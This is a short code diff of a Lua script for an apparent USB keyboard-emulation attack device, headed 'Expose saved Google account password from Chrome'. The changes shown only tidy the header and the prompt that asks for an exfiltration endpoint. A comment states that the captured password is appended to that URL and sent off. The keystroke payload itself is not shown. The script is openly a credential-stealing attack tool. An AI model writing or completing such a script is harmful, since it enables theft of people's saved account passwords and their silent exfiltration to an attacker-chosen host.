@@ -1,12 +1,16 @@
 ---
---- expose saved Google account password from Chrome
+--- Expose saved Google account password from Chrome
 ---
 require("common")
 
 kb = luausb.create({ id = 0, type = "keyboard" })
 
 -- This URL will be visited with the captured password appended to the end
-local endpoint = prompt("Endpoint querystring", "https://localhost/index.php?q=")
+local endpoint = prompt{
+    message="Enter the URL of the end-point to query.",
+    hint="End-point URL",
+    default="https://localhost/index.php?q="
+}
 
 while true do
     print("idle")
